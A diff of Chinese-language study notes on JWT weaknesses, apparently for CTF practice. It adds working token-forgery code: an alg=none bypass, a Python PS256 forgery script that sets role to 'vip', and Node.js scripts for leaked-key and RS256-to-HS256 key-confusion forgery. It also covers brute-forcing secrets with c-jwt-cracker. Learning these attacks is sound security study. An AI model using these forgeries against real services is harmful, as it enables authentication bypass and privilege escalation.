@@ -23,6 +23,20 @@ McX2dyX5yW0S6lUsDC4s4qQpKHW072bmoS3fRSaUn9I
 
 
 ^
+## **jwt密钥**
+```
+这里密钥secret=xxx;
+
+Algorithm algorithm = Algorithm.HMAC256(secret);
+
+JWT.create()
+    .withClaim("userId", userId) // 创建负载
+    .withExpiresAt(DateUtil.offsetHour(new Date(), 200)) // 设置超时日期 2小时
+    .sign(algorithm); // 创建签名并设置密钥
+```
+
+
+^
 ## **jwt会话**
 jwt一般后端通过json响应体或setcookie给前端
 前端通过请求头携带Authorization: Bearer xxx.xxx.xxx
@@ -116,10 +130,49 @@ print(base64.b64encode(b.encode('utf-8')))
 # 于是JWT：eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTY2MDg5NTk3M30.
 ```
 
+
+^
+#### **如果后端校验jwt不严**
+可以将jwt头的alg字段改为none，修改载体，在将第三方部分直接删除，保留一个点
+```
+xxx.xxx.
+```
+
+
+
+
 ^
 ## **PS256算法的jwt可以伪造**
 <https://blog.csdn.net/weixin_53090346/article/details/134277438>
 <https://www.cnblogs.com/S1gMa/p/16846438.html>
+
+我们不需要公钥和私钥就可以伪造jwt。
+```
+from json import loads, dumps
+from jwcrypto.common import base64url_encode, base64url_decode
+
+
+# 传入原ps256的jwt，修改payload后，输出新的jwt
+
+def ps256(topic):
+    [header, payload, signature] = topic.split('.')
+    parsed_payload = loads(base64url_decode(payload))
+    print(parsed_payload) # 原始payload
+
+    parsed_payload["role"] = "vip"  # 这里是想替换的字段
+
+    print(dumps(parsed_payload, separators=(',', ':'))) # 将Python对象编码成JSON格式的字符串
+
+    fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))
+
+    print(fake_payload)
+
+    return '{" ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"} '
+
+
+print(ps256('eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTY2MjQ2NTEsImlhdCI6MTcxNjYyMTA1MSwianRpIjoiS245NnNTNW1MXzVqdlpOQmJic0JMQSIsIm5iZiI6MTcxNjYyMTA1MSwicm9sZSI6Im1lbWJlciIsInVzZXJuYW1lIjoiSVNDQ21lbWJlciJ9.X7QknL7FHu5ZhkVfe2aqFjyWZfSPHRD_Ja-O7YLmD0ScFQRsF2d6d3p-oslfk3CVUeJZZoS7_Ym7kmz4YNg59hMcRW6zmdzEAk6-4thZE0Y2xJ80b2mvJgm1iV2S7g2spelJIE2Gaa282YLitOO-2HtCZqqVRziYLRQWt8GA2yZoDnUjufVGK8LClu3E6xYF_r2uWW67Z9MyjaZbm6Ni8Nl9to4tDvo7FRN-newIF7i4r01-rJW-baGnnbB7jKPkxLPDT-c2SIe5kAIXkoJvO_So2_FreRETrmZ-PAXq_iIPw6lOr0HYA5C9VXFYiVfwMa97ZfND9x7N2RzsOMBywQ'))
+```
+
 
 
 ^
@@ -127,11 +180,41 @@ print(base64.b64encode(b.encode('utf-8')))
 RS256加密的jwt是私钥加密，前端公钥解密。
 JWT的签名加密算法有两种，对称加密算法和非对称加密算法。
 对称加密算法比如HS256，加解密使用同一个密钥，保存在后端。
-非对称加密算法比如RS256，后端加密使用私钥，前端解密使用公钥，公钥是我们可以获取到的。
+非对称加密算法比如RS256，后端加密使用私钥，之后前端后端解密都使用公钥，公钥是我们可以获取到的。
 
-如果我们修改header，将算法从RS256更改为HS256，后端代码会使用RS256的公钥作为HS256算法的密钥。于是我们就可以用RS256的公钥伪造数据
+如果是公私钥泄露，直接解密伪造再加密。
+脚本
+```
+const jwt = require('jsonwebtoken'); 
+//npm install jsonwebtoken --save
+
+const fs = require('fs');
+
+var privateKey = fs.readFileSync(process.cwd()+'\\private.key');
+// console.log(privateKey);
+
+var token = jwt.sign({ user: 'admin' }, privateKey, { algorithm: 'RS256' });
+console.log(token)
+```
+或者用厨师，粘贴私钥
+![](.topwrite/assets/image_1735792548241.png)
+^
+如果只有公钥泄露：
+如果我们修改header，将算法从RS256更改为HS256，后端代码会使用RS256的公钥作为HS256算法的密钥。于是我们就可以用RS256的公钥伪造数据。
 CTF题目：[http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php](https://links.jianshu.com/go?to=http%3A%2F%2Fdemo.sjoerdlangkemper.nl%2Fjwtdemo%2Frs256.php)
+脚本
+```
+const jwt = require('jsonwebtoken'); 
+//npm install jsonwebtoken --save
 
+const fs = require('fs');
+
+var privateKey = fs.readFileSync(process.cwd()+'\\public.key');
+// console.log(privateKey);
+
+var token = jwt.sign({ user: 'admin' }, privateKey, { algorithm: 'HS256' });
+console.log(token)
+```
 
 
 
@@ -150,11 +233,11 @@ jwt没有主动失效，只有靠时间失效，容易被盗取。
 ## **破解jwt**
 如对HS256方式进行爆破密钥
 
-\#访问靶场，获取token
+1、访问靶场，获取token
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3MDIwMjQ3ODEsImxldmVsIjoidXNlciI
 sInVzZXIiOiJqYXNwZXIifQ.zzr9KoJFdElwSGjcs3zs6Zgv0Lp\_eA4Secn8sUEVgIA
 
-\#使用c-jwt-cracker-master 破解，<https://www.cnblogs.com/easyday/p/18022431#:~:text=Manual%20Com>
+2、使用c-jwt-cracker-master 破解，<https://www.cnblogs.com/easyday/p/18022431#:~:text=Manual%20Com>
 获得key：hello
 ```
 git clone https://github.com/brendan-rius/c-jwt-cracker
@@ -165,5 +248,13 @@ make
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3MDIwMjQ3ODEsImxldmVsIjoidXNlciI
 sInVzZXIiOiJqYXNwZXIifQ.zzr9KoJzs6Zgv0Lp_eA4Secn8sUEVgIA
 ```
-\#使用https\://jwt.io/，进行加密
+3、使用<https://jwt.io/>，或者 <https://www.bejson.com/jwt/> 进行加密
+
+
+^
+JWT_GUI离线必备：
+<https://github.com/Aiyflowers/JWT_GUI/releases/tag/replace_brute_error>
+
+签名的话可以用厨师
+
 
